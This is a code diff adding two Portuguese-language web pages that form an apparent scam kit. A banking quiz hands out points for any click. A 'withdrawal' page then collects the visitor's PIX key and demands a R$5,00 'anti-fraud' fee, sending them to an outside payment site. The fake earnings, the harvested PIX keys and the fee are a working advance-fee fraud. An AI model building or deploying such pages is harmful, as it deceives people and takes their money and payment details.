@@ -1,0 +1,135 @@
+> SAN:
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jogo de Perguntas sobre Bancos</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .points {
+            font-size: 20px;
+            margin: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Responda Perguntas sobre Bancos e Ganhe Pontos!</h1>
+    <p id="question"></p>
+    <button onclick="answerQuestion()">Responder</button>
+    <p class="points">Você tem <span id="points">0</span> pontos</p>
+</div>
+
+<script>
+    let points = 0;
+    const questions = [
+        'Qual banco tem o código 001?',
+        'Qual é o maior banco do Brasil em número de clientes?',
+        'O que significa CNPJ?',
+        'Qual banco oferece a conta digital "NuConta"?'
+    ];
+
+    function getRandomQuestion() {
+        const randomIndex = Math.floor(Math.random() * questions.length);
+        document.getElementById('question').innerText = questions[randomIndex];
+    }
+
+    function answerQuestion() {
+        points += 12; // Incrementa 12 pontos a cada resposta
+        document.getElementById('points').innerText = points;
+
+        if (points >= 100) { // Ao atingir 100 pontos, vai para a página de saque
+            window.location.href = "withdraw.html";
+        } else {
+            getRandomQuestion(); // Exibe nova pergunta
+        }
+    }
+
+    // Carrega a primeira pergunta
+    window.onload = getRandomQuestion;
+</script>
+
+</body>
+</html>
+
+> SAN:
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OpinaPro - Saque</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Solicitar Saque</h1>
+    <p>Parabéns, você acumulou <span id="points">100</span> pontos!</p>
+    <p>Para sacar seus ganhos, por favor, cadastre sua chave PIX abaixo:</p>
+    
+    <form>
+        <input type="text" placeholder="Digite sua chave PIX" required><br><br>
+        <button type="submit">Cadastrar Chave PIX</button>
+    </form>
+
+    <p><strong>Sistema Anti-Fraude:</strong> Para prevenir saques excessivos e fraudes, é necessário pagar uma taxa de R$5,00 para liberar seu saque.</p>
+
+    <p>Clique no botão abaixo para continuar e realizar o pagamento.</p>
+    
+    <button onclick="redirectToPayment()">Pagar Taxa de R$5,00</button>
+</div>
+
+<script>
+    function redirectToPayment() {
+        alert("Você será redirecionado para o sistema de pagamento.");
+        window.location.href = "https://sanstoreofc.ereemby.site";
+    }
+</script>
+
+</body>
+</html>
